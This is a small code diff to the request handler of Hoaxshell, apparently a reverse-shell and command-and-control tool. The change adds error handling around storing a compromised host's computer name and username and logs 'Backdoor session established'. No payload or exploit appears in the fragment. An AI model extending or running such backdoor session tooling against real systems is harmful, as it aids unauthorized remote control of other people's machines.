@@ -854,9 +854,16 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			self.end_headers()
 			self.wfile.write(bytes('OK', "utf-8"))
 			Sessions_manager.active_sessions[session_id]['execution_verified'] = True
-			Sessions_manager.active_sessions[session_id]['Computername'] = url_split[1]
-			Sessions_manager.active_sessions[session_id]['Username'] = url_split[2]
-			print(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{self.client_address[0]}{END}')
+
+			try: 
+				Sessions_manager.active_sessions[session_id]['Computername'] = url_split[1]
+				Sessions_manager.active_sessions[session_id]['Username'] = url_split[2]
+				print(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{self.client_address[0]}{END}')
+			except:
+				Sessions_manager.active_sessions[session_id]['Computername'] = "host"
+				Sessions_manager.active_sessions[session_id]['Username'] = "user"
+				print(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{self.client_address[0]}{END} Without host or username')
+				
 			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
 
 			try:				
